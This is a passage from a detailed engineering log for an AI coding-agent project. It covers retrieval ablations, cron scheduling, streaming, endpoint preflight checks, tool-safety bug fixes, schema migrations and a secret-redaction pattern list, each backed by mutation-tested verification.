this result: the 36-goal corpus has never existed in any run. Every eval home is fresh
and holds at most three episodes, the recall+profile split scores 6/6, and
`recall-deploykey` and `recall-oncall` have no `AGENT.md`, so they passed on episode
search alone. **No shortfall was measured in the system as it runs.** What was measured
is the corpus sustained real use would produce.

(The one home holding 134 episodes is `_t`, the shared test home - an artefact of tests
writing to a real database before `cd7db19` made state isolation autouse. Not a user
corpus either.)

### Verdict

**FR-408 is closed as NOT JUSTIFIED, and stays unbuilt.** Recorded in CONTEXT.md 8.2.
One case in six - a genuine vocabulary gap, two seconds against duration in
centiseconds - does not buy an embedding model, an image dependency that no-index
forces to build time, and a share of `MAX_SCHEMA_CHARS` charged every turn.

It reopens on a condition rather than a hunch: a real corpus that still shows the
shortfall *after* the query fix.

### The loose end, and it is not being smuggled in

The 2/6 -> 5/6 query fix is measured, free, and **not applied**. It cannot move any
eval number, because the eval's homes are too small to contain the bug - so by this
project's own rule (*revert anything that does not move the number*) it has not earned
a commit. It is logged here so the measurement is not lost, and it is a one-function
change to `_terms()` whenever a corpus exists that would show it.

---

## Stage D1 - FR-605, cron schedules (2026-08-31)

Offline, no quota. 510 -> 528 tests.

### What was consulted, and what was actually taken

A full scheduler subsystem is thousands of lines. Two ideas came out of reading
one and nothing else did:

**The ordering, which is the whole correctness argument.** `scheduler.py:7360` advances
`next_run_at` for every due job BEFORE any execution begins, and says why: *this
preserves at-most-once semantics*. Ours does the same - `fire()` advances `next_run`
guarded on the value it just read, and only the writer whose rowcount is 1 calls
`submit()`. A worker polling every two seconds would otherwise enqueue a task per poll
for the whole minute the schedule is due.

**`croniter` did NOT come across, and could not.** `pip.conf` sets `no-index`, so a
library not baked into the image does not exist - the same wall that stopped their
ripgrep-backed `search_files`. Five fields of `*`, `*/n`, `a-b` and `a,b` is 25 lines.

Their execution ledger was already borrowed once, in `worker.py`'s header.

### The shape

A `schedules` table beside `tasks`, and `run_worker()`'s existing poll calls `fire()`.
Schedules enqueue through `submit()`; the worker stays the only thing that executes a
task. A second execution path is how two components come to disagree about what ran.

### The test that could not fail, and the fix

**Recorded because it nearly shipped.** The first race test asserted the right property
and could not detect its own violation. Inverting the ordering in `fire()` - submit
first, advance after, exactly the bug the ordering exists to prevent - left **51 of 51
passing**.

The reason is worth keeping: the test called `fire()` twice, and the second call found
no due row at all, so it never reached the branch it was written to protect. It was
testing that an advanced schedule is not due, which was never in question.

The replacement interleaves for real - `next_run` is monkeypatched to advance the row
from underneath, standing in for the other worker between this one's SELECT and UPDATE.
Re-run against the same inverted ordering it **fails**, naming the duplicate submit.

Verified in both directions, which is the only reason the first version was caught:
correct code passes 51/51, inverted code fails 1.

### Verified

| | |
|---|---|
| offline suite, container | **528 passed** |
| `next_run` against real weekdays | `0 9 * * 1`, `*/15 * * * *`, `0 0 1 * *`, `30 3 * * 0` all correct |
| CLI round-trip | schedule, list, unschedule, unschedule-again |
| malformed expression | refused in `schedule()` before the insert, so `fire()` cannot trip on a stored row that no longer parses |

---

## Stage 2b - streaming on the OpenAI-compatible path (NFR-101) (2026-08-31)

Offline, no quota. 528 -> 544 tests.

### What was actually blocked

NFR-101 asks for a first token within 3 s at p50. CONTEXT.md had recorded it **NOT
MEASURABLE** since 2026-08-23, and the reason was not instrumentation: the
OpenAI-compatible path sent no `stream=True`, so there was no first token to time. One
block arrived at the end. The Anthropic path streamed all along.

### The shape

`_assemble()` collapses the delta stream into the SAME object shape the non-streaming
path produces, and `from_openai_message()` is then called unchanged. Two parsers would
be two things to keep agreeing; there is one.

`AGENT_STREAM` defaults on and restores the old single-block path exactly when off -
the fallback if an endpoint streams badly rather than not at all.

### Four traps, each with the test that catches it

| trap | what goes wrong | test |
|---|---|---|
| fragments grouped by arrival, not `index` | two interleaved calls splice one's arguments into the other, and the result parses often enough to look like a model error | `..._grouped_by_index_not_arrival` |
| `id`/`name` reassigned on every fragment | they arrive ONLY on a call's first fragment; later ones carry None, producing a nameless call | `..._not_overwritten_by_empties` |
| usage chunk skipped | it rides a FINAL chunk with no `choices`, so the obvious `if not chunk.choices: continue` drops it and every run reports 0 billed tokens | `..._choiceless_chunk_is_not_dropped` |
| `finish_reason` lost | a `length` scored as `done` is exactly the defect `04bcde9` fixed, reintroduced through a new path | `..._length_finish_reason_survives_streaming` |

**Verified in both directions.** Three mutations were applied to a correct assembler
and each was caught by the test written for it:

| mutation | result |
|---|---|
| group by arrival order | 1 failed, 189 passed |
| move the usage read below the choices guard | 1 failed, 189 passed |
| assign `id` unconditionally | 4 failed, 186 passed |

### Making NFR-101 a number rather than a claim

Streaming alone does not measure anything. `Reply.first_token_s` is recorded on every
`model` trace row and the harness medians it into `first_token_p50` on the run row.

A turn that did not stream reports **None, never 0.0** - a zero would pull the median
down while looking like the 3 s target was met, and that is the shape of an accidental
false pass this project has already had to retract once.

### What is NOT claimed

**The p50 is unmeasured.** Nothing here has spoken to a live endpoint. Every test above
drives hand-built chunk objects, which proves the assembly is correct and proves
NOTHING about latency. NFR-101 moves from NOT MEASURABLE to MEASURABLE-AND-UNMEASURED,
and the 3 s target is unverified rather than met.

**The dev guard has not been run.** Streaming changes how a reply arrives on the path
every scored run uses, and the offline equivalence test (same deltas -> same blocks as
the whole message) is an argument, not a measurement. A 15-case dev guard at 3 runs is
the check, and it costs roughly a day of the free tier.

---

## A four-lane retrieval stack, ported and mostly reverted (2026-08-31)

Offline, no quota. The user asked for a four-channel hybrid, memory graph,
spreading activation and cross-encoder rerank. All of it was built. Almost none of
it survived measurement, and the one thing that did was free.

### Headline

| configuration | recall@3 | recall@1 | image |
|---|---|---|---|
| as shipped that morning | 2/6 | 0/6 | 593 MB |
| **query fix alone** | **5/6** | **4/6** | **594 MB** |
| query fix + dense lane | 5/6 | 4/6 | 1.04 GB |
| dense lane alone | 3/6 | 0/6 | 1.04 GB |
| 4 lanes + graph + rerank | **1/6** | 0/6 | 1.22 GB |

**The faithful port scored worse than the code it replaced.** Kept: the query fix.
Reverted: onnxruntime, tokenizers, numpy, bge-small-en-v1.5, `agent/embeddings.py`,
the vector table, the edge table, spreading activation and the cross-encoder.

### The ablation, which is the whole value of this entry

| lane | recall@3 |
|---|---|
| sparse over `goal` | 4/6 |
| sparse over `answer` | **0/6** |
| dense over `body` | 1/6 |
| dense over `summary` | 3/6 |
| all four fused | 2/6 |
| + spreading activation | 2/6, no change |
| + cross-encoder rerank | **1/6, worse** |

Why each failed here and not there:

- **`answer`-sparse is 0/6** because our `answer` is a terse verdict where theirs is
  a generated summary paragraph. Same lane, different data, no signal.
- **The cross-encoder makes it worse** because ms-marco ranks web passages by
  relevance to a search query. An episode is not a passage and a goal is not a query.
- **Spreading activation changes nothing** at 36 episodes. It is built for a corpus
  where the graph is denser than the direct match, and ours is not.

### Two defects found in my own work, both by measuring rather than reasoning

**The 6/6 that was not real.** An intermediate result showed sparse+dense at 6/6 and
was reported as beating keyword-only. It rested on a bug: `_terms` sorted candidate
words by document frequency ASCENDING, which puts `df == 0` first - words appearing
in no episode at all. Those dead terms ate query slots, accidentally making the query
shorter and rarer, which is what actually helped. Fixing the bug dropped it to 3/6;
fixing it *and* re-deriving the term count reached 5/6 with no dense lane at all.

A number that improves for a reason you have not identified is not yet a result.

**The isolated probe that proved nothing.** `profile-units` - "two seconds" against
"duration in centiseconds", sharing one word - ranked 1 of 6 in a direct embedding
comparison, and that was taken as evidence dense retrieval would close it. Against
the real 35-episode corpus it never enters the top 3 at any depth from 5 to 35. A
six-way comparison says nothing about a thirty-five-way one, and `profile-units`
remains the single miss in every configuration tried.

### What actually moved the number

Two changes to the QUERY, neither touching the index:

1. **Keep only the rarest terms.** `_terms` OR-ed every word over two characters, so
   a goal matching `write`, `file`, `workspace` and `called` outranked one matching
   `Quartzite` and `deploy`. Swept after the `df == 0` fix: 2 and 3 terms both score
   5/6, 1 and 4+ score 4/6.
2. **Match `goal` alone, not the whole row.** 5/6 against 4/6. A query's rare words
   turn up in some other episode's answer or command list and outrank the episode
   whose GOAL is the thing being recalled.

### FR-408 and §11 are unchanged

§11 forbids vector search "before keyword recall has been measured and found
wanting". It was measured and found wanting only where the QUERY was wrong. Fixed,
keyword recall matches everything the dense lane could do. FR-408 stays closed as
NOT JUSTIFIED, now with an ablation behind it rather than a cost argument.

The trigger to reopen is unchanged and still unmet: a corpus where dense retrieval
beats a correctly-constructed keyword query. 36 goals is not that corpus, and the
honest caveat is that six pairs is a small sample - this says dense buys nothing
HERE, not that it never would.

550 tests, green with the models present and absent.

---

## Phase 0 - a preflight that probes the model, not just DNS (2026-08-31)

Offline build, ~40 tokens to run. 550 -> 559 tests.

The harness already refused to start when the egress proxy could not RESOLVE the
model host, and `_proxy_can_resolve`'s own docstring says why: *running is not the
same as usable*. It never checked whether the model behind that name replies.

Measured the same day: NVIDIA returned HTTP 503 `Service temporarily overloaded`
about two times in three. Four separate `real-humanize` invocations spent roughly an
hour each producing blocked rows, and one of them - before `c87f371` - was scored
**0/3 for a provider outage**. A 45 case-run split at that success rate would burn an
hour to produce a partial set nobody may quote.

`model_answers()` makes THREE consecutive minimal calls before a scored run starts and
refuses if any fails. Three because one success is not a state: a single probe passed
earlier that day, a run launched on the strength of it, and all three case-runs
blocked. `--no-preflight` measures anyway for anyone who wants the blocked rows.

### The defect in the first version, and it is the same lesson one level up

The first implementation probed **in the driver's own process** and failed with `no
API key` on a machine whose scored runs work perfectly. The host has neither the
`.env` file nor the proxy; a case-run has both, inside a container on the egress
network. It was probing a different operation, from a different place - which is
precisely what a preflight exists to avoid.

Now it runs `docker run` with the same image, the same `--env-file`, the same
`FORWARDED_ENV` and the same `HTTPS_PROXY` a case-run gets. A test asserts the
command is `docker`, carries `IMAGE`, joins `EGRESS_NET` and sets `HTTPS_PROXY`.

### Verified in both directions

| mutation | result |
|---|---|
| keep probing after a failure | 2 failed |
| `MODEL_PROBES = 1` | **passed** at first - no test asserted the DEFAULT |
| `MODEL_PROBES = 1`, after adding that test | 1 failed |

The second row is the same class of defect as the cron race test that could not fail:
every test passed `probes=3` explicitly, so lowering the default defeated the whole
preflight silently.

### Live

```
   probe 1: APIError: Service temporarily overloaded
the model endpoint is not answering consistently; refusing to start a scored run.
```

105 run directories before, 105 after - a refused preflight leaves nothing behind.

**Phase 0's MEASUREMENT is still outstanding.** The dev guard on streaming has not
run, because the endpoint will not hold still long enough to start it.

---

## Phase 3 - memory staleness and NOW.md (2026-08-31)

Offline, no quota. 559 -> 571 tests. Both are DESIGNS; neither ports a line of
anyone's code.

### 3.1 Stale episodes are down-ranked, not dropped

Ours never aged. A freshness window per item kind - 30 days for an event, 90
for a constraint, and NEVER for identity or preference - down-ranks past it
rather than deleting.

This project already has exactly two kinds, so one window is the honest version:
`AGENT.md` does not go through `search()` at all and is therefore the never-decay
tier; episodes are events. `MEMORY_STALE_DAYS` 30, `MEMORY_STALE_DECAY` 0.5.

Applied to the SCORE, not by filtering. bm25 is negative and more negative is
better, so multiplying a stale row by a fraction moves it toward zero and down the
list - verified empirically before relying on it, because the sign is the whole
mechanism. A filter would hide the only episode answering a question nobody has
asked in months, which is precisely when memory earns its keep.

**No reinforcement shield**, unlike theirs. We record when an episode was WRITTEN
and never when it was last USED, so there is no signal to shield on. Adding one
means a new column and a write on every retrieval.

Verified in both directions:

| mutation | result |
|---|---|
| filter stale rows out instead of down-ranking | 3 failed |
| invert the condition - penalise FRESH rows | 1 failed, the right one |

**Recall is unchanged at 5/6**, same single miss. Stated carefully: every episode
in that corpus is days old, so the decay never fires there. The measurement shows
no regression; it does not show the decay helps. The unit tests are what prove the
mechanism, and nothing yet proves the 30-day window is the right one.

### 3.2 NOW.md - written by a rule, never requested

A working scratchpad beside the durable profile, and deliberately unlike it:
`AGENT.md` is appended to and never decays, `NOW.md` is OVERWRITTEN every session
because it describes what is true now. Conflating them is how a finished project's
note becomes a standing rule.

**The design decision that matters is who writes it.** The usual design lets the
model keep its own scratchpad. This repo has already paid for that: `learn` asked the agent to
record something and was called 0 times in 15 sessions, while deterministic episode
injection went 0/18 to 15/18. So `finish` writes it from state that already exists
- goal, verdict, plan, cursor, files - and no model call or decision is involved.

The unfinished half is the point. A run ending `stuck` at turn 30 previously told
the next session nothing about how far it got, so a resumed or scheduled task
re-derived it:

```
# What I was last doing

Last session was asked: Fix the off-by-one in moving_average
It ended: stuck
Reached step 2 of 3: fix the slice
Still to do: run the suite
Files touched: stats.py
```

**Unmeasured against the pass rate.** Neither change touches `real-humanize`, and
neither has been through a scored run. They are offline work with offline tests,
and are described as that rather than as improvements.

---

## Phase 4 - proactivity: notice what is outstanding and speak first (2026-08-31)

Offline, no quota. 571 -> 581 tests.

FR-605 shipped the cron half this morning. A heartbeat is the other half:
re-read your notes, look for anything unfinished, and speak without being asked.

`attention()` is deterministic - no model call - and reads three sources that
already exist:

| source | why |
|---|---|
| `awaiting-approval` tasks | what the agent REFUSED while nobody watched. UR-16 asks to review exactly this, and it is the one status that cannot resolve itself |
| `failed` tasks | a run that ended badly and has not been looked at |
| `NOW.md` | the step a session was on when it stopped (Phase 3.2) |

### Silence is the half that makes it usable

`review()` returns None when nothing is outstanding, and a schedule that finds
nothing enqueues nothing. A check that always speaks is an interruption, and the
first thing anyone does with one is turn it off.

The rule that notifications must not interrupt an active conversation falls
out of what is already here rather than needing code: `MAX_WORKERS` caps concurrent
tasks at one, so a queued review waits behind whatever is running (FR-607).

### One deviation from the plan, and the reason

The plan said *add a built-in schedule that enqueues a review goal*. That is wrong:
a review's content is whatever is outstanding NOW, so a schedule storing fixed text
would report the state at scheduling time forever.

Instead a schedule whose goal is the sentinel `@review` is RESOLVED AT FIRE TIME.
One `if` in `fire()`, no new mechanism, and it still enqueues through `submit()` -
so the worker stays the only thing that runs a task. Scheduling it needs nothing
new either: `--schedule "0 9 * * *" "@review"`.

### Verified in both directions

| mutation | result |
|---|---|
| speak even when nothing is outstanding | 3 failed |
| store the sentinel instead of resolving it | 2 failed |
| surface finished tasks too | 1 failed, the right one |

Live:

```
$ python -m agent --review
nothing needs attention

$ python -m agent --review          # after a refusal
  task 7a5cced6 (awaiting-approval): delete the old backups - refused while unattended: run_shell
queued 6f5ef1a8 to review it
```

**Unmeasured against the pass rate**, like Phase 3. It is offline work with offline
tests and is described as that rather than as an improvement.

---

## The preflight was too easily satisfied, and nothing stopped a dead run (2026-08-31)

581 -> 583 tests. Both defects were found by the preflight built this morning
failing to do its job, twice, in the same hour.

### What happened

```
attempt 2/16  10:38Z   probe 1 ok   probe 2 ok   probe 3 503
attempt 4/16  11:09Z   probe 1 ok   probe 2 ok   probe 3 ok   -> guard launched
11:09-11:20             fix-import run 0  BLOCKED x3
                        fix-import run 1  BLOCKED x2 ...
```

The gate passed 3/3 and the endpoint 503'd on the very next request.

### Defect 1 - three probes at 20s samples 45 SECONDS

Probes take 1-3s, so `3 x 20s` is a ~45 second window. NVIDIA held for 45 seconds
and failed immediately after. **Widened to 5 probes at 45s, a ~3 minute window**,
with a test asserting the window is at least 120s rather than asserting the two
constants separately - narrowing either one now fails.

### Defect 2 - and this is the one that cost the time

No gate covers a 30-minute run from its first minute. Once the endpoint died the
driver ground through case-run after case-run, each burning three attempts and
three minutes of backoff, to produce a directory of blocked rows and `pass 0/0`.
**It did that twice, about 45 minutes each.**

`BLOCKED_RUN_LIMIT = 2` aborts the run after two consecutive blocked case-runs. Two
is enough to tell an outage from one unlucky case, because a case-run that blocks
has ALREADY failed three attempts with backoff between them.

The counter resets on any completed case-run - `consecutive_blocked + 1 if code ==
BLOCKED else 0`, not `+=`. A mutation to the accumulating form is caught.

### Verified in both directions

| mutation | result |
|---|---|
| narrow the gate back to 3 x 20s | 1 failed |
| accumulate blocks without resetting | 1 failed |

### The standing lesson

**A preflight samples a moment; a run occupies an hour.** Gating the start is
necessary and never sufficient - the run needs its own abort. This project already
had the first half (`_proxy_can_resolve`, then `model_answers`) and neither noticed
that the second was missing.

---

## Three tool bugs found by reading our own code (2026-08-31)

583 -> 595 tests. No quota. All three were present the whole time and none had
ever shown up in a trace, which is the point below.

### The bugs

| | measured |
|---|---|
| `read_file` on a PNG | **2,496 characters of mojibake** into the context window. No binary guard existed at all |
| `write_file` over a `.docx` | destroyed it irrecoverably and **reported success** - a .docx is a zip |
| `run_shell` on timeout | **discarded everything the command printed**, and left **2 orphaned children** running |

The third is the worst for a coding agent: a `pytest` run that hangs after
reporting 40 failures reported none of them, because `TimeoutExpired` propagated
and the partial output died with it. On a real repository that IS the result.

The orphan half is a failure this project already had written down for the
harness - *`timeout` kills the client but leaves the container running, and the
orphan corrupts the shared workspace mid-case* - sitting unnoticed in our own
`run_shell`. `subprocess.run(shell=True)` kills `/bin/sh`, never its tree.

### What was taken

`tools/binary_extensions.py` is **VENDORED VERBATIM** - the first file in this
project that is. The value IS the list, and a hand-written set of 80-odd
extensions would be shorter and wrong. Its own comment named the `.docx` hazard,
which we would not have found alone. NOTICE said *nothing is vendored*; corrected.

From `tools/code_execution_tool.py` only the DESIGN: kill the process group, not
the process. Their version uses `psutil` to walk the tree, which `no-index` puts
out of reach; `start_new_session=True` plus `os.killpg` is stdlib and does the
same job.

### The method, corrected

Earlier the same day I ranked 7 of 142 liftable reference modules by keyword, tested
each against our recorded traces, found **0 useful**, and reported that as a
verdict on lifting.

**The test was the error.** A capability we do not have cannot appear in our
traces - `read_file` never logged a binary read *because it never refused one*.
"Does our data show this problem" is a bar almost nothing passes by construction.

Reading OUR OWN CODE for gaps found all three in about ten minutes. That is the
filter from now on: find the gap first, then look for their code that fills it.

### Verified in both directions

| mutation | result |
|---|---|
| discard partial output on timeout | 1 failed |
| kill the shell instead of the group | 1 failed |

An existing test asserted `TimeoutExpired` PROPAGATES, which is the contract this
changes. It was updated rather than deleted: the property it was written for -
that the call is bounded (FR-202) - is unchanged and still asserted, and it now
also checks the forked grandchild its compound command exists to create.

---

## edit_file was silently corrupting non-UTF-8 files (2026-08-31)

595 -> 601 tests. No quota. Found by reading our own code, like the three before it.

### The bug

```
before:  b'# café
x = 1
'      a latin-1 e-acute
edit:    x = 1  ->  x = 2
after:   b'# cafï¿½
x = 2
'   U+FFFD
```

The edit succeeded, the diff looked clean, and **a byte the agent never touched
was destroyed**. `read_text(errors="replace")` followed by `write_text` is lossy
by construction: every edit to a file with one non-UTF-8 byte corrupted it, on
every real repository that has one.

`edit_file` also bypassed the guard `write_file` had gained an hour earlier, and
rewrote a `.docx` as text.

### The fix, and where it goes

`surrogateescape` on read AND write round-trips arbitrary bytes losslessly. That
puts lone surrogates in the receipt, which are invalid in UTF-8 and break the
provider's encode step - so they are stripped in `shrink()`, the one seam every
tool result crosses on its way to the model.

The write-verify check had to change with it: it compared a `surrogateescape`
write against an `errors="replace"` read, so it reported a failed write on every
correct edit to a non-UTF-8 file. It fired immediately, which is the check earning
its keep.

### Both directions, and TWO of three mutations did not fail

| mutation | first result | after fixing the test |
|---|---|---|
| `errors="replace"` on read | 1 failed | - |
| drop the surrogate sanitiser | **220 passed** | 1 failed |
| let `edit_file` touch a `.docx` | **220 passed** | branch DELETED |

**The sanitiser test asserted `json.dumps`, which serialises a lone surrogate
happily.** The real failure is `.encode("utf-8")`. A test that cannot fail is
worse than no test, and only the mutation showed it.

**The `.docx` branch was unreachable.** Every container document is already in
`BINARY_EXTENSIONS`, so the binary guard fires first - the live output said *is a
binary file*, not the container message. Deleted rather than kept: §13 makes dead
code a defect. `write_file` keeps its own, because it has no binary guard.

---

## The binary guard was missing in two more places (2026-08-31)

601 -> 605 tests. No quota. Same method as the four before: read our own code,
find the gap, then reach for their code.

| | measured |
|---|---|
| `search_files` | a `.o` and a `.zip` containing the term each matched and emitted a line of mojibake - and, sorting alphabetically, both came BEFORE the real hit. Against `MATCH_CAP` they crowd out genuine matches entirely |
| `write_file` | overwriting an existing `logo.png` replaced it with the string `oops` and reported success |

The second is a gap I left myself. The guard added earlier the same day covered
container documents only, on the reasoning that a `.docx` is a zip - which is
equally true of a `.png`, and I did not check.

Both directions: narrowing `write_file` back to documents fails 1 test, letting
`search_files` read binaries fails 1.

### The day's tally, and what it says

```
read_file      dumped binary into the context window, no guard existed at all
write_file     destroyed .docx silently, then .png silently
edit_file      corrupted every non-UTF-8 file it touched
edit_file      rewrote binaries as text
run_shell      discarded a timed-out command's output
run_shell      left orphaned processes holding the workspace
search_files   returned binary garbage ranked above real matches
```

Nine defects in the tools the agent uses on every task, all found in one
afternoon, none needing the provider. Two of them - `edit_file` corrupting
non-UTF-8 files and `run_shell` losing timeout output - are the kind that cost
real-repository passes without ever appearing as an error.

**None had ever shown up in a trace**, which is the whole lesson. Ranking seven
borrowed modules by keyword and testing them against recorded traces found 0 useful.
Reading our own code for gaps found nine in an afternoon. A capability we do not
have cannot appear in traces - `read_file` never logged a binary read because it
never refused one.

---

## Phase A - schema migrations (2026-08-31)

605 -> 613 tests. No quota. Two new files: `agent/migrations.py`,
`tests/test_migrations.py`, both recorded in CONTEXT.md 12 as deviations.

### The drift was live, not hypothetical

Every store used `CREATE TABLE IF NOT EXISTS`, which is right for a fresh database
and silently wrong for one already on disk - it skips the statement entirely.

Measured against a real database from `.agent/homes`:

```
code says:  fts5(..., tokenize='porter')        added 2026-08-31
disk has:   fts5(...)                           default tokenizer
```

Two agents on the same commit, different retrieval behaviour, and **no error
anywhere**. The upgrade path is now measured end to end on that same database:
v0 -> v2, porter present, the episode preserved, search still returning, and a
second open a no-op.

### The bug the tests found in the migration runner itself

`with conn:` does NOT wrap DDL. Python's sqlite3 auto-begins a transaction only
for INSERT/UPDATE/DELETE/REPLACE, so `CREATE TABLE` executes outside any
transaction and commits immediately.

The consequence is worse than a partial migration. A migration creating two tables
and failing on the second leaves the first behind; `user_version` correctly does
not advance; and every retry then fails **forever** on *table already exists*. A
store that can never finish migrating.

Fixed with explicit `BEGIN` / `COMMIT` / `ROLLBACK` around each migration, with
`isolation_level` saved and restored so the caller's connection is unchanged.

### The rule that makes this safe

A migration is identified by its POSITION in the list. Never re-ordered, never
edited once released, never conditional on what a table currently looks like -
inspecting the current shape is how two databases at the same version come to
differ. Appending is the only legal edit, and one test asserts the version IS the
list length so an insertion in the middle is caught.

### Both directions

| mutation | result |
|---|---|
| back to `with conn` so DDL escapes the transaction | 1 failed |
| drop the porter rebuild, making v2 a no-op | 1 failed |

613 tests, green together and file-by-file.

---

## The prompt listed 4 tools; the agent has 7 (2026-08-31) - UNMEASURED

Prompted by "results are failing, fix it". The unit suite was
green at 613; what is failing is the agent - real repositories 4/10, `real-humanize`
1 pass in 58, reads 9-16 times and never edits.

### What was missing

`agent/coding_context.py` carries a **coding posture**: a profile declaring which
toolset to collapse to and which operating brief to inject. Two lines of that brief
name our failure mode exactly:

> Make changes through the tools, not the chat. Edit with `patch`/`write_file`. Do
> NOT print code blocks to the user as a substitute for editing.

> If the same region fails twice, rewrite the enclosing function or file with
> `write_file` instead of attempting a third patch.

We had neither. Our prompt said *read before you edit* and never said *edit*.

### The measured finding, from 624 recorded runs

The `## Tools` section listed **four** tools. The agent has seven built-in plus MCP.

```
listed in the prompt (4)   8,428 calls   95.5%
not listed           (6)     392 calls    4.5%
search_files                   70 calls    0.8%
run_shell                   4,209 calls   47.7%
```

And what `run_shell` was actually doing, across 4,209 calls:

| | | |
|---|---|---|
| `find` | 1,266 | 30.1% |
| `pytest` | 1,083 | 25.7% |
| `grep`/`rg` | 755 | 17.9% |
| `ls` | 708 | 16.8% |
| `cat`/`head`/`tail` | 90 | 2.1% |

**2,819 of 4,209 - 67% - were doing a job a purpose-built tool already does**, and
about 32% of every tool call this project has ever made. `search_files` exists
precisely because a raw grep is unbounded, and its own docstring says *use this
instead of run_shell with grep, find or ls*. It was used 70 times.

That connects to two open numbers: the budget exhaustion (421,265 tokens at turn 20
of 30) and "reads a lot, never edits" - the agent was exploring through shell, with
unbounded output, and running out of room before it acted.

### The change

`prompts/SOUL.md`, 33 lines -> 55. Every real tool named and no tool named that does
not exist - `fetch` was dropped because it is MCP-provided and not always present,
and the suite runs without the `mcp` package at all. Plus, from their brief:

- `run_shell` is **for running things**: tests, builds, git. Not for looking around.
- **Change the code, do not describe the change.** Writing out what the fix would be
  is not fixing it.
- After **two** failures on the same region, stop patching and rewrite the function
  with `write_file`.

### UNMEASURED, and that is the honest label

A prompt change is measured like a code change and this one has not been. The
endpoint has been returning 503 at roughly 1-in-3 all day and the dev guard has
never run.

What IS measured is that the prompt was wrong: it presented a four-tool list to an
agent with seven, and usage follows the list at 95.5%. Whether fixing it moves the
pass rate is a separate question, and the answer is not yet known.

---

## NFR-203 was only half implemented (2026-08-31)

613 -> 622 tests. No quota. Gap found by reading our own code, filled with a
pattern list and NOT a redactor - the distinction is the whole entry.

### The gap

`redact()` replaced values found in `os.environ`. Measured, everything else went
to the model verbatim:

```
OPENAI_API_KEY=sk-proj-REALSECRET1234567890abcdefXYZ
AWS_KEY = "AKIAIOSFODNN7EXAMPLE"
GITHUB = "ghp_16CharsMinimumTokenValueHere00"
postgres://admin:s3cr3tpw@db.internal:5432/app
```

A repository's `.env` is exactly the kind of file a coding agent reads.

### Their pattern list lifts; their redactor does NOT

`agent/redact.py` is 1,427 lines and its own tests pass 97/97 here. Applied to
our tree it altered **29 lines of 14,243**:

```
spent_tokens: int               ->  spent_tokens: ***
budget_tokens: int | None       ->  budget_tokens: *** | None
max_tokens=settings.MAX_TOKENS  ->  max_tokens=settin...ENS
```

Type annotations and identifiers destroyed. It matches `NAME=value` wherever NAME
merely CONTAINS key/token/secret - correct for terminal output and chat, and
catastrophic on source code, which is what this agent reads all day. **I was
about to apply it where it does not belong.**

What was taken is the curated part: 40 issuer prefixes, the PEM block, the JWT
shape, and the DSN password position. All four are unambiguous.

### The boundary that took it from 14 false positives to 1

`sk_[A-Za-z0-9_]{10,}` (ElevenLabs) matched INSIDE ordinary identifiers -
`ri`**`sk_classified`**, `ta`**`sk_to_running`** - and redacted 14 lines of this
project's own source. A negative lookbehind fixed it: a prefix only counts at a
token boundary. Now **1 false positive in 14,334 lines**, and that one is this
module's own docstring, which contains a DSN example on purpose.

The same guard then caught a bad TEST: a fixture built `xxxxsk-proj-SECRET`, where
the key is glued to preceding letters and is correctly not a secret.

### Both directions

| mutation | result |
|---|---|
| drop the token boundary | 2 failed |
| unwire it from `redact()` | 6 failed |
| redact the whole DSN rather than the password | 1 failed |

Only the password goes from a connection string - an agent debugging one needs to
see where it points.

---

## FR-503/504's trigger was tested and did not fire (2026-09-04)

Phase 3 of the browser plan. **No browser was built, and that is the result.**

Three cases, each written so the page ships INPUTS and never the answer:

| case | what a fetch sees | answer | score |
|---|---|---|---|
| `browser-dashboard` | an empty table and a dash | 744 | **3/3** |
| `browser-quota` | "No tier submitted yet" | 212500 | **3/3** |
| `browser-incidents` | 3 of 6 incidents | INC-4361 | **3/3** |

`fetch` alone scored 9/9. The dashboard case took five turns - fetch, fetch,
fetch raw, write - reading the REGIONS array out of the <script> tag and doing
the arithmetic itself.

### Why a static fixture cannot produce this trigger

Anything a browser computes from shipped JS, an agent with run_shell and Python
computes from the same source. Hiding the answer behind a click or a form only
hides it from a PARSER, not from a reader. A real trigger needs state the client
cannot derive - a server-side session, an authenticated round-trip, a canvas
render - and NFR-205 points egress at a static http.server by design.

Third time this project has predicted a capability floor and been wrong the same
way: the web split was expected to score 0 without a fetch tool and scored 18/18.

### What this saves

Chromium into an image already at 1.61 GB, and 4-6 tool schemas at ~580 chars
charged on EVERY turn of EVERY run whether a browser is used or not. 8.2 costed
that in August and the cost has only risen since.

The cases are kept as `split: browser` - a standing gate that costs nothing until
run.

---

## FR-408 built: keyword 0/40 -> gte-base 37/40 on the recall corpus (2026-09-04)

Phase 2. **Kept on the corpus evidence, NOT on a split delta - the split shows
none.**

| | recall@1 | recall@3 |
|---|---|---|
| keyword, as shipped | 0/40 | **0/40** |
| MiniLM-L6 dense-first | 16/40 | 24/40 |
| **gte-base dense-first** | **27/40** | **37/40  (92%)** |

| `recall` split | |
|---|---|
| dense on | **18/18** |
| dense off | **18/18** |

### The split cannot see this and that is the point

Its six cases hold at most three episodes per home, which is the corpus 8.2
already described as too small for the shortfall to appear. Both arms score
18/18. Reverting on that would be using the instrument this whole phase existed
to replace. The benefit is a real mailbox - hundreds of episodes, months of
them - and no split tests that yet.

### The model was chosen by measurement, and size predicted it BACKWARDS

```
gte-base      109M   r@3 37/40  92%   <- kept
bge-base      109M   r@3 32/40  80%
mxbai-large   335M   r@3 31/40  78%
bge-large     335M   r@3 30/40  75%
e5-base       109M   r@3 25/40  62%
MiniLM-L6      23M   r@3 24/40  60%
gte-small      33M   r@3 28/40  70%
e5-small       33M   r@3 20/40  50%
bge-small      33M   r@3 16/40  40%
```

Both 335M models score BELOW gte-base at 109M, and bge-small at 33M scores below
MiniLM at 23M. Choosing by parameter count would have been wrong twice.

### Quantisation is per-model, not free

MiniLM int8 measured identical to fp32 at a quarter the size. gte-base int8
loads, runs, raises nothing and scores **1/40**. Assuming the MiniLM result
transferred would have shipped a 2% retrieval lane that looked healthy.

### Three things measured wrong on the way

**RRF.** A host probe said fused 32/40; the container said 12/40. The probe
credited the keyword lane only for the TARGET episode - a boost the real code
cannot give. Dense-first was measured at 23/40 against RRF's 12/40 on the same
corpus: a lane scoring 0/40 still offers twenty rows and each takes a slot.

**No similarity floor exists.** Correct matches score a median cosine of 0.320,
WRONG matches 0.352, and nonsense queries reach 0.318. Every floor trades
correct answers for rejected nonsense about 1:1. `context_for` therefore keeps
the property it is tested on by passing `semantic_lane=False`... except it does
not: measured, the dense lane costs nothing there, so it runs in both paths and
the two tests that assert "nothing matched returns nothing" are pinned to the
KEYWORD lane, where that property lives.

**A .env with host paths broke the rig.** `_SET_BY_SPAWN` has always claimed
